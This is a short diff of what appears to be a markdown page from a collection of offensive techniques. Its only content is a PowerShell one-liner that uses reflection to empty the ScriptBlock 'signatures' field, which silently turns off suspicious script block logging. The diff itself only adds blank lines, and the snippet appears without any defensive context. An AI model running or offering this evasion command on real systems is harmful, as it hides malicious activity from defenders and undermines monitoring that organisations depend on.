@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:36:17.635844+00:00'
 ```ps1
 [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
 ```
+
+
